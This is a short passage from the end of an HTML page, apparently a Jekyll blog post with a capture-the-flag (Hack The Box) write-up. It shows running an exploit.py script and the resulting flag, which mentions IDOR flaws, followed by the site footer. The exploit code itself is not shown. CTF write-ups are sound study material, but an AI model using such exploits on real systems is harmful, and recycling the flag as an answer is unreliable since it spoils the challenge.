+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x exploit.py
+<span class="nv">$ </span>./exploit
+HTB<span class="o">{</span>1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!<span class="o">}</span>
+</code></pre></div></div>
+
+</div>
+        </div>
+        <footer class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        🛠️ Powered by Jekyll 🛠️
+        <br> 📖 Hosted on GitHub Pages 📖
+    </div>
+</footer>
+    </body>
+</html>
